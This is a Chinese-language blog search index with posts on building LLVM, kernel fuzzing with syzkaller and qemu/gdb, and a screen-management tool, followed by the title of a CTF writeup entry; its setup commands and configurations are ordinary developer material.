<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>LLVM备忘录</title>
    <link href="/2023/03/02/LLVM%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2023/03/02/LLVM%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>记录LLVM使用心得，备忘录</p><a id="more"></a><h2 id="源码安装LLVM"><a href="#源码安装LLVM" class="headerlink" title="源码安装LLVM"></a>源码安装LLVM</h2><ul><li>软件依赖：</li></ul><table><thead><tr><th>Package</th><th>Version</th><th>Notes</th></tr></thead><tbody><tr><td><a href="http://cmake.org/" target="_blank" rel="noopener">cmake</a></td><td>&gt;&#x3D;3.13.4</td><td>Makefile&#x2F;workspace generator</td></tr><tr><td><a href="http://gcc.gnu.org/" target="_blank" rel="noopener">GCC</a></td><td>&gt;&#x3D;7.1.0</td><td>C&#x2F;C++ compiler</td></tr><tr><td><a href="http://www.python.org/" target="_blank" rel="noopener">python</a></td><td>&gt;&#x3D;3.6</td><td>Automated test suite(Only needed for automatic test suite in <code>llvm/test</code>)</td></tr><tr><td><a href="http://zlib.net/" target="_blank" rel="noopener">zlib</a></td><td>&gt;&#x3D;1.2.3.4</td><td>Compression library(Optional)</td></tr><tr><td><a href="http://savannah.gnu.org/projects/make" target="_blank" rel="noopener">GNU Make</a></td><td>&gt;&#x3D;3.79.1</td><td>Makefile&#x2F;build processor(Optional)</td></tr></tbody></table><ul><li>编译安装</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">set</span> -e<span class="hljs-comment"># dependencies</span>sudo apt updatesudo apt install -y cmake ninja-build<span class="hljs-comment"># download source</span>version=<span class="hljs-variable">$1</span> <span class="hljs-comment"># like 13.0.1</span>wget https://github.com/llvm/llvm-project/releases/download/llvmorg-<span class="hljs-variable">$version</span>/llvm-project-<span class="hljs-variable">$version</span>.src.tar.xztar xvJf llvm-project-<span class="hljs-variable">$version</span>.src.tar.xzmkdir -p llvm-project-<span class="hljs-variable">$version</span>.src/build<span class="hljs-built_in">cd</span> llvm-project-<span class="hljs-variable">$version</span>.src/buildcmake -G Ninja\-DCMAKE_BUILD_TYPE=<span class="hljs-string">"Release"</span> \-DLLVM_ENABLE_PROJECTS=<span class="hljs-string">"clang;lld;lldb;compiler-rt"</span> \-DLLVM_INSTALL_UTILS=ON \-DLLVM_ENABLE_RTTI=ON \-DLLVM_ENABLE_RUNTIMES=<span class="hljs-string">"libcxx;libcxxabi"</span> ../llvmninja -j8<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\nninja finish, return value: $?"</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\nplease: sudo ninja install"</span><span class="hljs-comment"># sudo ninja install</span></code></pre></div><h2 id="常用分析Pass"><a href="#常用分析Pass" class="headerlink" title="常用分析Pass"></a>常用分析Pass</h2><h3 id="打印相关信息Pass"><a href="#打印相关信息Pass" class="headerlink" title="打印相关信息Pass"></a>打印相关信息Pass</h3><h3 id="CFG-Pass"><a href="#CFG-Pass" class="headerlink" title="CFG Pass"></a>CFG Pass</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://llvm.org/docs/index.html" target="_blank" rel="noopener">[1] LLVM官方文档</a>（其中值得看的几个子链接<a href="https://llvm.org/docs/GettingStarted.html" target="_blank" rel="noopener">Getting Started with the LLVM System</a>，<a href="https://llvm.org/docs/tutorial/index.html" target="_blank" rel="noopener">LLVM Tutorial: Table of Contents</a>，<a href="https://llvm.org/docs/ProgrammersManual.html" target="_blank" rel="noopener">LLVM Programmer’s Manual</a>，<a href="https://llvm.org/docs/WritingAnLLVMPass.html" target="_blank" rel="noopener">Writing an LLVM Pass</a>）</p><p><a href="https://zhuanlan.zhihu.com/p/594998469" target="_blank" rel="noopener">[2] LLVM Analysis Pass 实验（一）基础操作汇总</a></p><p><a href="https://zhuanlan.zhihu.com/p/596465125" target="_blank" rel="noopener">[3] LLVM Analysis Pass 实验（二）控制流（Control Flow）可视化</a></p>]]></content>
    
    
    <categories>
      
      <category>Static Analysis</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LLVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内核Fuzz技巧与备忘</title>
    <link href="/2023/02/01/%E5%86%85%E6%A0%B8Fuzz%E6%8A%80%E5%B7%A7%E4%B8%8E%E5%A4%87%E5%BF%98/"/>
    <url>/2023/02/01/%E5%86%85%E6%A0%B8Fuzz%E6%8A%80%E5%B7%A7%E4%B8%8E%E5%A4%87%E5%BF%98/</url>
    
    <content type="html"><![CDATA[<p>留个备忘录方便查看做kernel fuzzing中遇到的问题和解决技巧（持续更新中ing）</p><a id="more"></a><h2 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h2><ul><li>一键安装syzkaller</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">set</span> -e sudo apt updatesudo apt install -y debootstrap qemu qemu-kvmsudo apt install -y git make build-essential openssh-serversudo apt install -y libssl-dev libelf-devsudo apt install -y flex bison libc6-dev libc6-dev-i386 linux-libc-dev libgmp3-dev libmpfr-dev libmpc-dev<span class="hljs-built_in">pushd</span> ~wget https://dl.google.com/go/go1.17.6.linux-amd64.tar.gztar -zxvf go1.17.6.linux-amd64.tar.gz<span class="hljs-built_in">echo</span> <span class="hljs-string">"export GOPATH=~/go"</span> &gt;&gt; ~/.bashrc<span class="hljs-built_in">echo</span> <span class="hljs-string">"export PATH=<span class="hljs-variable">$GOPATH</span>/bin:<span class="hljs-variable">$PATH</span>"</span> &gt;&gt; ~/.bashrc<span class="hljs-built_in">source</span> ~/.bashrcgit <span class="hljs-built_in">clone</span> https://github.com/google/syzkaller.git<span class="hljs-built_in">cd</span> syzkallermake -j<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\nDone!"</span></code></pre></div><ul><li>查看crashs目录结果</li></ul><div class="hljs"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span>set -eprint_help() &#123;        echo -e "Usage: ./get_result.sh /path/to/crashs_dir"&#125;if [[ ! -n "$1" ]]then        print_helpelse    ls $1 | while read crash    do        echo -e "\n======== $crash ========"        desc=`cat $1/$crash/description`        echo -e "$desc"        syz_repro=`ls $1/$crash | grep "repro.prog" | wc -l`        c_repro=`ls $1/$crash | grep "repro.cprog" | wc -l`        repro=`echo "$syz_repro + $c_repro" | bc`        echo -e "Repro: $repro"    done    echo -e "\nDone!"fi</code></pre></div><ul><li>TBD</li></ul><h2 id="qemu-gdb调试内核"><a href="#qemu-gdb调试内核" class="headerlink" title="qemu+gdb调试内核"></a>qemu+gdb调试内核</h2><p><strong>通过qemu启动待调试的内核：</strong></p><div class="hljs"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 基于syzkaller的create-image.sh，开启nokaslr</span>KERNEL=../linux-6.1.12IMAGE=./stretch.imgqemu-system-x86_64 \  -kernel $KERNEL/arch/x86/boot/bzImage \  -append "console=ttyS0 root=/dev/sda nokaslr slub_debug=P kmemleak=on"\  -hda $IMAGE \  -net user,hostfwd=tcp::16112-:22 -net nic \  -enable-kvm \  -cpu host \  -nographic \  -serial mon:stdio \  -m 1G \  -s \  -smp 1 \  -pidfile kernel.debug.pid \<span class="hljs-meta">  2&gt;</span><span class="bash">&amp;1 | tee kernel.debug.log</span></code></pre></div><p>相关参数解释：</p><ul><li><code>-s</code>：监听gdb 1234端口</li><li><code>-S</code>：启动后挂起，等待连接（optional）</li><li><code>-nographic</code>：不启动图形界面，与<code>console=ttyS0</code>组合使用，将调试信息输出到<code>ttyS0</code></li></ul><p><strong>gdb连接进行调试</strong>（我安装的是gdb 10.2，不存在部分博客中提到需要修改gdb源码再编译的问题）：</p><div class="hljs"><pre><code class="hljs bash">gdb vmlinux --<span class="hljs-built_in">eval</span>-command=<span class="hljs-string">"target remote tcp::1234"</span></code></pre></div><p><strong>Trouble shooting</strong></p><ul><li><code>Cannot insert breakpoint 1. Cannot access memory at address 0xffffffff8610ae1b</code><ul><li>用硬件断点<code>hbreak</code>而不是软件断点<code>break</code></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
      <tag>Kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>批量窗口管理工具screenctl</title>
    <link href="/2023/01/26/%E6%89%B9%E9%87%8F%E7%AA%97%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7screenctl/"/>
    <url>/2023/01/26/%E6%89%B9%E9%87%8F%E7%AA%97%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7screenctl/</url>
    
    <content type="html"><![CDATA[<p>自己写的一个批量管理linux screen的工具screenctl，支持批量创建删除，命令执行，Web UI管理等功能。（Collaborators wanted）</p><a id="more"></a><p>好吧，Web UI 还没做出来。🤣</p><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h2><ul><li><p>INFO：</p><ul><li>项目开源：<a href="https://github.com/QGrain/screenctl/" target="_blank" rel="noopener">https://github.com/QGrain/screenctl/</a></li><li>Pypi主页：<a href="https://pypi.org/project/screenctl/" target="_blank" rel="noopener">https://pypi.org/project/screenctl/</a></li></ul></li><li><p>安装</p></li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 安装screen</span>sudo apt install screen<span class="hljs-comment"># 安装screenctl (刚上传pypi不久，可能其他源还没有更新)</span>pip install screenctl -i https://pypi.org/simple</code></pre></div><ul><li><code>screenctl -h</code> 查看帮助</li></ul><div class="hljs"><pre><code class="hljs bash">usage: screenctl [-h] [-c CONF] [-v] actionscreenctl 0.0.4, Controller <span class="hljs-keyword">for</span> screenpositional arguments:  action                create, delete, <span class="hljs-built_in">stat</span>, serveroptional arguments:  -h, --<span class="hljs-built_in">help</span>            show this <span class="hljs-built_in">help</span> message and <span class="hljs-built_in">exit</span>  -c CONF, --conf CONF  path to configuration  -v, --verbose         show verbose output</code></pre></div><h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2 使用"></a>2 使用</h2><ul><li>批量创建</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 批量创建screen并按照指定配置文件执行一条命令（常用于Fuzz）</span>screenctl create -c job.json<span class="hljs-comment"># job.json示例如下: </span>&#123;    <span class="hljs-string">"screen_name1"</span>: <span class="hljs-string">"echo \"name1\" &gt;&gt; name1.log"</span>,    <span class="hljs-string">"screen_name2"</span>: <span class="hljs-string">"timeout 12h /PATH/TO/afl-fuzz -i in -o out PROGRAM ARGS @@"</span>,    <span class="hljs-string">"screen_name3"</span>: <span class="hljs-string">"ping -c 100 baidu.com"</span>&#125;<span class="hljs-comment"># 批量查看screen状态</span>screenctl <span class="hljs-built_in">stat</span> -c job.json</code></pre></div><ul><li>批量删除</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 批量删除job.json中的所有窗口</span>screenctl delete -c job.json<span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> 支持自定义删除</span></code></pre></div><ul><li><strong>Web UI (TODO)，抽时间写 🕊🕊🕊</strong></li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> 启动Web UI来批量管理screen，界面类似于supervisor</span><span class="hljs-comment"># 支持UI界面批量/单独操作screen的启动与删除，以及其中的执行命令和输出回显</span>screenctl server -c job.json<span class="hljs-comment"># 🕊咕子咕子</span></code></pre></div><h2 id="3-实现原理"><a href="#3-实现原理" class="headerlink" title="3 实现原理"></a>3 实现原理</h2><h3 id="批量管理模块"><a href="#批量管理模块" class="headerlink" title="批量管理模块"></a>批量管理模块</h3><p>调用<code>screen</code>罢了hhh</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 创建screen</span>screen -dm NAME<span class="hljs-comment"># 在screen中执行命令</span>screen -x -S NAME -X stuff CMD<span class="hljs-comment"># 删除screen</span>screen -r NAME -X quit</code></pre></div><p>To be completed</p>]]></content>
    
    
    <categories>
      
      <category>Tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DevOps</tag>
      
      <tag>Tricks</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>syzkaller安装与使用</title>
    <link href="/2022/10/31/syzkaller%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/31/syzkaller%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>本文记录了我的syzkaller安装和使用的<strong>踩坑记录</strong>。</p><p>syzkaller是2015年Google提出的一款主要用Go编写的基于覆盖率的内核fuzzer。<a id="more"></a>2017年它的持续性fuzzing平台syzbot部署上线，迄今为止已经挖掘并报告了超过4000个内核漏洞。</p><blockquote><p>强烈不建议在虚拟机中安装syzkaller并进行内核fuzz，有条件尽量在配置较好的服务器上进行（亲测orz</p></blockquote><p>配置代理的一个大坑，保证http_proxy等代理对sudo生效（不论当前用户是否为root，都需要加以下内容）</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment">#/etc/sudoers</span>Defaults env_keep += <span class="hljs-string">"http_proxy https_proxy ftp_proxy"</span></code></pre></div><h2 id="1-安装依赖"><a href="#1-安装依赖" class="headerlink" title="1 安装依赖"></a>1 安装依赖</h2><ul><li>安装基本软件依赖</li></ul><div class="hljs"><pre><code class="hljs bash">sudo apt updatesudo apt install -y debootstrap qemu qemu-kvmsudo apt install -y git make build-essential openssh-serversudo apt install -y libssl-dev libelf-devsudo apt install -y flex bison libc6-dev libc6-dev-i386 linux-libc-dev libgmp3-dev libmpfr-dev libmpc-devsudo apt install -y bc <span class="hljs-comment"># 在一次纯净docker测试中发现编译内核时缺少这个包</span></code></pre></div><ul><li>安装Go</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~wget https://go.dev/dl/go1.19.7.linux-amd64.tar.gztar -zxvf go1.17.6.linux-amd64.tar.gz <span class="hljs-built_in">export</span> GOPATH=~/go<span class="hljs-built_in">export</span> GOROOT=~/go<span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$GOPATH</span>/bin:<span class="hljs-variable">$PATH</span><span class="hljs-comment"># 测试是否安装成功，顺便检查一下go env</span>go env</code></pre></div><h2 id="2-安装syzkaller"><a href="#2-安装syzkaller" class="headerlink" title="2 安装syzkaller"></a>2 安装syzkaller</h2><ul><li>源码编译安装syzkaller</li></ul><div class="hljs"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/google/syzkaller.git<span class="hljs-built_in">cd</span> syzkaller<span class="hljs-comment"># 这一步对内存有要求。在虚拟机中分配4G以上内存+4G swap可以成功编译。</span>make<span class="hljs-comment"># make无报错且在syzkaller/bin目录下看到相关二进制即安装成功</span></code></pre></div><h2 id="3-编译内核"><a href="#3-编译内核" class="headerlink" title="3 编译内核"></a>3 编译内核</h2><ul><li>下载内核源码</li></ul><p>在 <a href="https://mirrors.edge.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/</a> 选择想要测试的内核版本</p><div class="hljs"><pre><code class="hljs bash">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.9.331.tar.xztar xvJf linux-4.9.331.tar.xz</code></pre></div><ul><li>编译内核</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 生成编译配置</span><span class="hljs-built_in">cd</span> linux-4.9.331make CC=<span class="hljs-string">"/usr/bin/gcc"</span> defconfigmake CC=<span class="hljs-string">"/usr/bin/gcc"</span> kvm_guest.config<span class="hljs-comment"># 在.config文件追加如下内容</span>CONFIG_KCOV=yCONFIG_DEBUG_INFO=yCONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT=y <span class="hljs-comment"># 巨坑，在高版本中还需开启此选项，否则DEBUG_INFO会自动被DEBUG_INFO_NONE覆盖</span>CONFIG_KASAN=yCONFIG_KASAN_INLINE=yCONFIG_KCOV_INSTRUMENT_ALL=yCONFIG_KCOV_ENABLE_COMPARISONS=y <span class="hljs-comment"># 要求gcc8+</span>CONFIG_CONFIGFS_FS=yCONFIG_SECURITYFS=yCONFIG_DEBUG_KMEMLEAK=yCONFIG_STACKTRACE=y<span class="hljs-comment"># UBSAN，不可以(和哪些选项?)一起用，会报make编译错误。</span>CONFIG_UBSAN=yCONFIG_UBSAN_SANITIZE_ALL=y<span class="hljs-comment"># 若想避免后续运行syzkaller的时候出现[FAILED] Failed to start Raise network interfaces.的错误，再追加以下两行</span>CONFIG_CMDLINE_BOOL=yCONFIG_CMDLINE=<span class="hljs-string">"net.ifnames=0"</span><span class="hljs-comment"># 启用错误注入技术</span>CONFIG_FAULT_INJECTION=yCONFIG_FAULT_INJECTION_DEBUG_FS=yCONFIG_FAULT_INJECTION_USERCOPY=yCONFIG_FAILSLAB=yCONFIG_FAIL_PAGE_ALLOC=yCONFIG_FAIL_MAKE_REQUEST=yCONFIG_FAIL_IO_TIMEOUT=yCONFIG_FAIL_FUTEX=y<span class="hljs-comment"># 开启namespace sandboxing相关的选项</span>CONFIG_NAMESPACES=yCONFIG_UTS_NS=yCONFIG_IPC_NS=yCONFIG_PID_NS=yCONFIG_NET_NS=yCONFIG_CGROUP_PIDS=yCONFIG_MEMCG=yCONFIG_USER_NS=y<span class="hljs-comment"># 补充一些被证明有用的选项</span>CONFIG_LOCKDEP=yCONFIG_PROVE_LOCKING=yCONFIG_DEBUG_ATOMIC_SLEEP=yCONFIG_PROVE_RCU=yCONFIG_DEBUG_VM=yCONFIG_REFCOUNT_FULL=yCONFIG_FORTIFY_SOURCE=yCONFIG_HARDENED_USERCOPY=yCONFIG_LOCKUP_DETECTOR=yCONFIG_SOFTLOCKUP_DETECTOR=yCONFIG_HARDLOCKUP_DETECTOR=yCONFIG_BOOTPARAM_HARDLOCKUP_PANIC=yCONFIG_DETECT_HUNG_TASK=yCONFIG_WQ_WATCHDOG=yCONFIG_DEFAULT_HUNG_TASK_TIMEOUT=140CONFIG_RCU_CPU_STALL_TIMEOUT=100<span class="hljs-comment"># 然后使得上述追加内容生效，注意这六个选项的位置不再位于文件尾部</span>make CC=<span class="hljs-string">"/usr/bin/gcc"</span> olddefconfig<span class="hljs-comment"># 最后开始编译内核（对内存有一定要求，我在虚拟机中编译失败，在台式物理机中5min编译完毕）</span>make CC=<span class="hljs-string">"/usr/bin/gcc"</span> -j8<span class="hljs-comment"># 期间并无报错且最后看到如下输出即编译成功</span><span class="hljs-comment"># Kernel: arch/x86/boot/bzImage is ready  (#1)</span></code></pre></div><ul><li>以下是(较早以前)一次运行日志的开头部分，所提示not enabled的几个config已经包含在上述配置里。</li></ul><div class="hljs"><pre><code class="hljs bash">2022/12/30 03:01:42 code coverage           : enabled2022/12/30 03:01:42 comparison tracing      : CONFIG_KCOV_ENABLE_COMPARISONS is not enabled2022/12/30 03:01:42 extra coverage          : enabled2022/12/30 03:01:42 delay kcov mmap         : enabled2022/12/30 03:01:42 setuid sandbox          : enabled2022/12/30 03:01:42 namespace sandbox       : /proc/self/ns/user does not exist2022/12/30 03:01:42 Android sandbox         : enabled2022/12/30 03:01:42 fault injection         : CONFIG_FAULT_INJECTION is not enabled2022/12/30 03:01:42 leak checking           : CONFIG_DEBUG_KMEMLEAK is not enabled2022/12/30 03:01:42 net packet injection    : /dev/net/tun does not exist2022/12/30 03:01:42 net device setup        : enabled2022/12/30 03:01:42 concurrency sanitizer   : /sys/kernel/debug/kcsan does not exist2022/12/30 03:01:42 devlink PCI setup       : PCI device 0000:00:10.0 is not available2022/12/30 03:01:42 NIC VF setup            : PCI device 0000:00:11.0 is not available2022/12/30 03:01:42 USB emulation           : /dev/raw-gadget does not exist2022/12/30 03:01:42 hci packet injection    : /dev/vhci does not exist2022/12/30 03:01:42 wifi device emulation   : /sys/class/mac80211_hwsim/ does not exist2022/12/30 03:01:42 802.15.4 emulation      : /sys/bus/platform/devices/mac802154_hwsim does not exist2022/12/30 03:01:42 corpus                  : 0 (deleted 0 broken)2022/12/30 03:01:44 seeds                   : 165/685</code></pre></div><h2 id="4-创建虚拟机"><a href="#4-创建虚拟机" class="headerlink" title="4 创建虚拟机"></a>4 创建虚拟机</h2><ul><li>创建image</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 在创建一个image目录</span>mkdir image &amp;&amp; <span class="hljs-built_in">cd</span> imagecp ../syzkaller/tools/create-image.sh ./chmod u+x create-image.sh<span class="hljs-comment"># debian的镜像太慢了，可切换到清华源 https://mirrors.tuna.tsinghua.edu.cn/debian/</span>sed -i <span class="hljs-string">'s/http:\/\/deb.debian.org\/debian-ports/https:\/\/mirrors.tuna.tsinghua.edu.cn\/debian\//g'</span> create-image.sh./create-image.sh<span class="hljs-comment"># 看到如下warning是正常现象，说明没有debian-archive-keyring，如果网络正常可以按照其替代方案切换到mirror https://deb.debian.org/debian并继续执行</span><span class="hljs-comment"># I: Keyring file not available at /usr/share/keyrings/debian-archive-keyring.gpg; switching to https mirror https://deb.debian.org/debian</span><span class="hljs-comment"># 也可以通过安装debian-archive-keyring来避免该warning（可选）</span>sudo apt install -y debian-archive-keyring<span class="hljs-comment"># 执行create-image.sh完毕后看到目录有如下内容即为成功</span>chroot  create-image.sh  stretch.id_rsa  stretch.id_rsa.pub  stretch.img</code></pre></div><ul><li>安装qemu虚拟机</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 在当前image目录创建boot.sh，注意路径的指向要正确</span>qemu-system-x86_64 \ -kernel ../kernels/linux-4.9.331/arch/x86/boot/bzImage \ -append <span class="hljs-string">"console=ttyS0 root=/dev/sda debug earlyprintk=serial slub_debug=QUZ"</span>\ -hda ./stretch.img \ -net user,hostfwd=tcp::10021-:22 -net nic   \ -<span class="hljs-built_in">enable</span>-kvm \ -nographic \ -m 2560M \ -smp 2 \ -pidfile vm.pid \ 2&gt;&amp;1 | tee vm.log <span class="hljs-comment"># 运行boot.sh启动虚拟机，以root用户无密码登录</span>chmod u+x boot.sh./boot.sh<span class="hljs-comment"># 然后测试qemu虚拟机的ssh服务是否成功启动</span>ssh -i stretch.id_rsa -p 10021 -o <span class="hljs-string">"StrictHostKeyChecking no"</span> root@localhost</code></pre></div><h2 id="5-运行syzkaller"><a href="#5-运行syzkaller" class="headerlink" title="5 运行syzkaller"></a>5 运行syzkaller</h2><ul><li>创建syzkaller配置文件</li></ul><p><strong>注意：为了避免出现[FAILED] Failed to start Raise network interfaces.的错误，要在下述配置文件加入”cmdline”: “net.ifnames&#x3D;0”或者在.config中追加CMDLINE相关的两条配置项</strong></p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 在syzkaller目录下创建workdir</span><span class="hljs-built_in">cd</span> syzkallermkdir workdir<span class="hljs-comment"># 在syzkaller目录下创建my.cfg，各选项均采用绝对路径</span>&#123;    <span class="hljs-string">"target"</span>: <span class="hljs-string">"linux/amd64"</span>,    <span class="hljs-string">"http"</span>: <span class="hljs-string">"127.0.0.1:56741"</span>,    <span class="hljs-string">"workdir"</span>: <span class="hljs-string">"/home/zzy/kernel-fuzz/syzkaller/workdir"</span>,    <span class="hljs-string">"kernel_obj"</span>: <span class="hljs-string">"/home/zzy/kernel-fuzz/kernels/linux-4.9.331"</span>,    <span class="hljs-string">"image"</span>: <span class="hljs-string">"/home/zzy/kernel-fuzz/image/stretch.img"</span>,    <span class="hljs-string">"sshkey"</span>: <span class="hljs-string">"/home/zzy/kernel-fuzz/image/stretch.id_rsa"</span>,    <span class="hljs-string">"syzkaller"</span>: <span class="hljs-string">"/home/zzy/kernel-fuzz/syzkaller"</span>,    <span class="hljs-string">"procs"</span>: 8,    <span class="hljs-string">"type"</span>: <span class="hljs-string">"qemu"</span>,    <span class="hljs-string">"vm"</span>: &#123;        <span class="hljs-string">"count"</span>: 8,        <span class="hljs-string">"kernel"</span>: <span class="hljs-string">"/home/zzy/kernel-fuzz/kernels/linux-4.9.331/arch/x86/boot/bzImage"</span>,        <span class="hljs-string">"cmdline"</span>: <span class="hljs-string">"net.ifnames=0"</span>,        <span class="hljs-string">"cpu"</span>: 2,        <span class="hljs-string">"mem"</span>: 2048    &#125;&#125;</code></pre></div><ul><li>开始内核模糊测试</li></ul><div class="hljs"><pre><code class="hljs bash">./bin/syz-manager -config my.cfg<span class="hljs-comment"># 如果出现Is another process using the image [/home/zzy/kernel-fuzz/image/stretch.img]?提示</span><span class="hljs-comment"># 则说明之前boot.sh开启的qemu虚拟机尚未关机，进入到该虚拟机执行关机命令poweroff即可</span></code></pre></div><ul><li>在 <a href="http://localhost:56741/" target="_blank" rel="noopener">http://localhost:56741/</a> 查看fuzz的进度和结果。关于web ui界面中coverage的数据<code> P1%(P2%) of N1(N2)</code>的含义，我通过分析源码<code>pkg/cover/html.go</code>理解了它们的含义。</li></ul><div class="hljs"><pre><code class="hljs go">// pkg/cover/html.go...&#123;&#123;define "dir"&#125;&#125;&#123;&#123;range $dir := .Dirs&#125;&#125;&lt;li&gt;&lt;span id="path/&#123;&#123;$dir.Path&#125;&#125;" class="caret hover"&gt;&#123;&#123;$dir.Name&#125;&#125;&lt;span class="cover hover"&gt;&#123;&#123;if $dir.Covered&#125;&#125;&#123;&#123;$dir.Percent&#125;&#125;%(&#123;&#123;$dir.PercentInCoveredFunc&#125;&#125;%)&#123;&#123;else&#125;&#125;---&#123;&#123;end&#125;&#125;&lt;span class="cover-right"&gt;of &#123;&#123;$dir.Total&#125;&#125;(&#123;&#123;$dir.TotalInCoveredFunc&#125;&#125;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;ul class="nested"&gt;&#123;&#123;template "dir" $dir&#125;&#125;&lt;/ul&gt;&lt;/li&gt;&#123;&#123;end&#125;&#125;&#123;&#123;range $file := .Files&#125;&#125;&lt;li&gt;&lt;span class="hover"&gt;&#123;&#123;if $file.Covered&#125;&#125;&lt;a href="#&#123;&#123;$file.Path&#125;&#125;" id="path/&#123;&#123;$file.Path&#125;&#125;" onclick="onFileClick(&#123;&#123;$file.Index&#125;&#125;)"&gt;&#123;&#123;$file.Name&#125;&#125;&lt;/a&gt;&lt;span class="cover hover"&gt;&lt;a href="#&#123;&#123;$file.Path&#125;&#125;" id="path/&#123;&#123;$file.Path&#125;&#125;"onclick="&#123;&#123;if .HasFunctions&#125;&#125;onPercentClick&#123;&#123;else&#125;&#125;onFileClick&#123;&#123;end&#125;&#125;(&#123;&#123;$file.Index&#125;&#125;)"&gt;                                                &#123;&#123;$file.Percent&#125;&#125;%(&#123;&#123;$file.PercentInCoveredFunc&#125;&#125;%)&lt;/a&gt;&lt;span class="cover-right"&gt;of &#123;&#123;$file.Total&#125;&#125;(&#123;&#123;$file.TotalInCoveredFunc&#125;&#125;)&lt;/span&gt;&lt;/span&gt;&#123;&#123;else&#125;&#125;&#123;&#123;$file.Name&#125;&#125;&lt;span class="cover hover"&gt;---&lt;span class="cover-right"&gt;of &#123;&#123;$file.Total&#125;&#125;&lt;/span&gt;&lt;/span&gt;&#123;&#123;end&#125;&#125;&lt;/span&gt;&lt;/li&gt;&#123;&#123;end&#125;&#125;&#123;&#123;end&#125;&#125;...</code></pre></div><p>由此可知，<code>P1%</code>的含义是<code>file.Percent</code><strong>大概是PC覆盖占比</strong>，对应<code>N1</code>为<code>file.Total</code><strong>PC覆盖总数</strong>。<code>P2%</code>的含义是<code>file.PercentInCoveredFunc</code><strong>函数覆盖占比</strong>，对应<code>N2</code>为<code>file.TotalInCoveredFunc</code><strong>函数覆盖总数</strong></p><p>上面这段划掉，我还没搞清楚…</p><h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6 参考"></a>6 参考</h2><p><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener">[1] Setup: Ubuntu host, QEMU vm, x86-64 kernel</a></p><p><a href="https://zhuanlan.zhihu.com/p/506059739" target="_blank" rel="noopener">[2] 零基础syzkaller挖掘Linux内核漏洞</a></p><p><a href="http://pwn4.fun/2019/05/31/Syzkaller%E5%AE%89%E8%A3%85%20Fuzz%20Qemu%20amd64%20Kernel/" target="_blank" rel="noopener">[3] Syzkaller安装 Fuzz Qemu amd64 Kernel</a></p><p><a href="https://github.com/google/syzkaller/blob/master/docs/linux/troubleshooting.md" target="_blank" rel="noopener">[4] syzkaller官方troubleshooting</a></p><p><a href="https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md" target="_blank" rel="noopener">[5] syzkaller官方kernel_configs</a></p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
      <tag>Kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NeSE丙升乙CTF升级赛Writeup</title>
    <link href="/2022/10/03/%E4%B8%99%E5%8D%87%E4%B9%99CTF%E5%8D%87%E7%BA%A7%E8%B5%9Bwriteup/"/>
    <url>/2022/10/03/%E4%B8%99%E5%8D%87%E4%B9%99CTF%E5%8D%87%E7%BA%A7%E8%B5%9Bwriteup/</url>
    
